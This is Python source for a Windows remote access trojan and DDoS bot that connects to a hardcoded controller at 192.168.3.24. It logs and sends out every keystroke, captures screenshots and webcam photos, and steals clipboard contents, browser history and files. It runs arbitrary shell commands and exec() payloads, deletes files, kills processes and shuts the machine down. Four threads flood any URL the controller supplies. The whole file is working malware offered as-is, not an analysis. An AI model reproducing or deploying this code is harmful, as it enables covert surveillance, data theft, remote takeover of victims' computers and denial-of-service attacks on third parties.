import os
import time
import winreg
import socket
import threading
import requests
import win32api,win32con
import win32clipboard
import sys
import ctypes
import pyautogui
import subprocess
import PySimpleGUI
import platform
import webbrowser
import shutil
import cv2
import numpy as np
import string
import easygui
import browserhistory
from prettytable import PrettyTable
import threading
import keyboard
ip = "192.168.3.24"
port = 6666

def ison(jincheng):
    a = os.popen('tasklist | findstr "' + jincheng+'"').readlines()
    if a == []:
        return False
    else:
        return True

def getnwip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    a = s.getsockname()[0]
    s.close()
    return a
def get_text():
    win32clipboard.OpenClipboard()
    text = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return text
def getip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    a = s.getsockname()[0]
    s.close()
    return a


gtip = getip()

def jpjl():
    def on_press(event):
        requests.get('http://'+ip+':5000/kb',params={'kb':gtip+':'+str(event)})
    keyboard.on_press(on_press)
    keyboard.wait()

def closeExe():
    while True:
        try:
            close = eval(requests.get('http://'+ip+':5000/close').text)
            for i in close:
                if ison(i):
                    os.popen('taskkill /f /im "'+i+'"')
        except:
            continue

def ddos():
    while True:
        url = 'http://'+ip+':5000/ddos'
        wz = requests.get(url).text
        if wz.replace(' ','') == '':
            print('yes')
            time.sleep(10)
            continue
        else:
            #print('yes')
            for i in range(5000):
                try:
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}
                    requests.get(wz, headers=headers)
                except Exception as a:
                    print('error',str(a))

def zhu():
    '''def getip():
        try:
            return requests.get(url="http://ip.42.pl/raw").text
        except:
            return "can't get the ip"'''
    ip_port = (ip,port)

    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sk.connect(ip_port)

    def send(nr):
        nr = gtip+':'+nr
        sk.send(nr.encode(encoding='utf-8'))
    def sendfile(lj):
        url = 'http://'+ip+':5000/sc'
        files = {'file': (gtip,open(lj, "rb").read())}
        requests.post(url, files=files)
    def getpanfu():
        disk_list = []
        for c in string.ascii_uppercase:
            disk = c + ':'
            if os.path.isdir(disk):
                disk_list.append(disk)
        return disk_list

    send(' is in!!!')
    while True:
        date = sk.recv(8192)  # 接受信息
        nr = date.decode('utf-8')
        if nr[:5] == 'king:':
            nr = nr[5:]
            if nr[:3] == 'ip:':
                if nr[3:].split(':')[0] != gtip:
                    continue
                else:
                    nr = ':'.join(nr[3:].split(':')[1:])
            if nr[:4] == 'cmd:':
                nr = nr[4:]
                send('\n'+os.popen(nr).read())
            elif nr == 'restart':
                send('ok')
                os.system('shutdown -r -t 1')
            elif nr == 'shutdown':
                send('ok')
                os.system('shutdown -s -t 1')
            elif nr[:5] == 'send:':
                send('ok')
                nr = nr[5:]
                win32api.MessageBox(0, nr, '', win32con.MB_OK)
                send('The pop-up window has been closed \nmsg:'+nr)
            elif nr[:6] == 'input:':
                send('ok')
                nr = nr[6:]
                send(easygui.enterbox(nr))
            elif nr == 'remove this':
                try:
                    open('remove.bat', 'w', encoding='ANSI').write(
                        'taskkill /f /t /im "'+sys.argv[0].split('\\')[::-1][0]+'"\ndel ".\\'+sys.argv[0].split('\\')[::-1][0]+'"\ndel .\\remove.bat\ncls')
                    os.system('start .\\remove.bat')
                except:
                    send('失败')
            elif nr == 'config':
                try:
                    system_content = '\n\nsystem name:   ' + platform.system() + '\n' + 'system name and system version:   ' + platform.platform() + '\n' + 'system version:   ' + platform.version() + '\n' + 'system bit:   ' + str(platform.architecture()) + '\n' + 'computer type:   ' + platform.machine() + '\n' + 'The network name of the computer:   ' + platform.node() + '\n' + 'Computer processor information:   ' + platform.processor() + '\n' + 'ip:   ' + getnwip()
                    send(system_content)
                except:
                    send('失败')
            elif nr == 'get browser':
                try:
                    dc = browserhistory.get_browserhistory()
                    jl = []
                    for i in dc:
                        jl.append(i)
                    send(str(jl))
                except:
                    send('失败')
            elif nr.startswith('browser history:'):
                try:
                    nr = nr[16:]
                    dc = browserhistory.get_browserhistory()
                    a = dc[nr]
                    jl = ''
                    num = 0
                    for j in a:
                        table = PrettyTable()
                        table.add_column(j[1], [j[2], j[0]])
                        jl += str(table)+'\n'
                        num += 1
                    send(jl[:-1])
                except Exception as a:
                    send("error:"+str(a))
            elif nr == 'get clipboard':
                try:
                    send(get_text())
                except:
                    send('失败')
            elif nr[:4] == 'say:':
                try:
                    nr = nr[4:]
                    open('read.vbs', 'w', encoding='ANSI').write('CreateObject("SAPI.SpVoice").Speak "' + nr + '"')
                    os.system('read.vbs')
                    os.remove('read.vbs')
                except:
                    send("error can't say")
            elif nr == 'screenshot':
                try:
                    img = pyautogui.screenshot()  # 分别代表：左上角坐标，宽高
                    # 对获取的图片转换成二维矩阵形式，后再将RGB转成BGR
                    # 因为imshow,默认通道顺序是BGR，而pyautogui默认是RGB所以要转换一下，不然会有点问题
                    img = cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR)
                    # cv2.imshow("img.jpg", img)
                    cv2.imwrite('img.jpg', img)
                    #cv2.waitKey(0)
                    sendfile('./img.jpg')
                    os.remove('img.jpg')
                    send('ok')
                except:
                    send('error')
            elif nr == 'photo':
                try:
                    cap = cv2.VideoCapture(0)  # 开启摄像头
                    f, frame = cap.read()  # 将摄像头中的一帧图片数据保存
                    cv2.imwrite('youimg.jpg', frame)  # 将图片保存为本地文件
                    cap.release()  # 关闭摄像头
                    sendfile('./youimg.jpg')
                    os.remove('youimg.jpg')
                    send('ok')
                except:
                    send('error')
            elif nr[:5] == 'file:':
                try:
                    nr = nr[5:]
                    wenjianjiayuwenjianjia = []
                    for root, dirs, files in os.walk(nr):
                        wenjianjiayuwenjianjia.append(dirs)
                        break
                    for root, dirs, files in os.walk(nr):
                        wenjianjiayuwenjianjia.append(files)
                        break
                    wj = '\n\n'
                    for i in wenjianjiayuwenjianjia[0]:
                        wj+='folder:'+i+'\n'
                    wj += '\n'
                    for i in wenjianjiayuwenjianjia[1]:
                        wj+='file:'+i+'\n'
                    wj+='\n\n\nIn folder:'+nr+'\n\n'
                    send(wj)
                except:
                    send('file error')
            elif nr[:7] == 'remove:':
                try:
                    nr = nr[7:]
                    if os.path.isfile(nr):
                        os.remove(nr)
                        send('ok')
                    elif os.path.isdir(nr):
                        shutil.rmtree(nr)
                        send('ok')
                except:
                    send('remove error')
            elif nr[:5] == 'copy:':
                try:
                    nr = nr[5:].split(' | ')
                    if os.path.isfile(nr[0]):
                        shutil.copy(nr[0],nr[1])
                    elif os.path.isdir(nr[0]):
                        shutil.copytree(nr[0],nr[1])
                except Exception as a:
                    send('copy error:'+str(a))
            elif nr[:5] == 'give:':
                try:
                    nr = nr[5:]
                    url = 'http://' + ip + ':5000/xz'
                    ctt = requests.get(url).content
                    open(nr,'wb').write(ctt)
                    send('ok')
                except:
                    send('give error')
            elif nr[:9] == 'get file:':
                try:
                    nr = nr[9:]
                    url = 'http://' + ip + ':5000/scfile'
                    files = {'file': (nr.replace('\\','/').split('/')[::-1][0],open(nr, "rb"))}
                    requests.post(url, files=files)
                    send('ok')
                except:
                    send('get error')
            elif nr[:7] == 'rename:':
                try:
                    nr = nr[7:].split(' | ')
                    os.rename(nr[0],nr[1])
                    send('ok')
                except:
                    send('rename error')
            elif nr[:9] == 'make dir:':
                try:
                    nr = nr[9:]
                    os.mkdir(nr)
                    send('ok')
                except:
                    send('make dir error')
            elif nr[:10] == 'make file:':
                try:
                    nr = nr[10:].split(' | ')
                    open(nr[0],'w',encoding='utf-8').write(nr[1])
                    send('ok')
                except:
                    send('make file error')
            elif nr == 'all drive':
                try:
                    send(str(getpanfu()))
                except:
                    send('get drive error')
            elif nr == 'close':
                send('ok')
                os.system('taskkill /f /t /im "'+sys.argv[0].split('\\')[::-1][0]+'"')
            elif nr == 'hello':
                send('hello')
            elif nr[:4] == 'run:':
                nr = nr[4:]
                try:
                    exec(nr)
                    send('ok')
                except Exception as error:
                    print(str(error))
            elif ''.join(nr.split()) == '':
                continue
            else:
                send('\nerror command')

    #sk.close#结束连接
z = threading.Thread(target=zhu)
DDOS = threading.Thread(target=ddos)
DDOS2 = threading.Thread(target=ddos)
DDOS3 = threading.Thread(target=ddos)
DDOS4 = threading.Thread(target=ddos)
jp = threading.Thread(target=jpjl)
cls = threading.Thread(target=closeExe)
cls.start()
jp.start()
z.start()
DDOS.start()
DDOS2.start()
DDOS3.start()
DDOS4.start()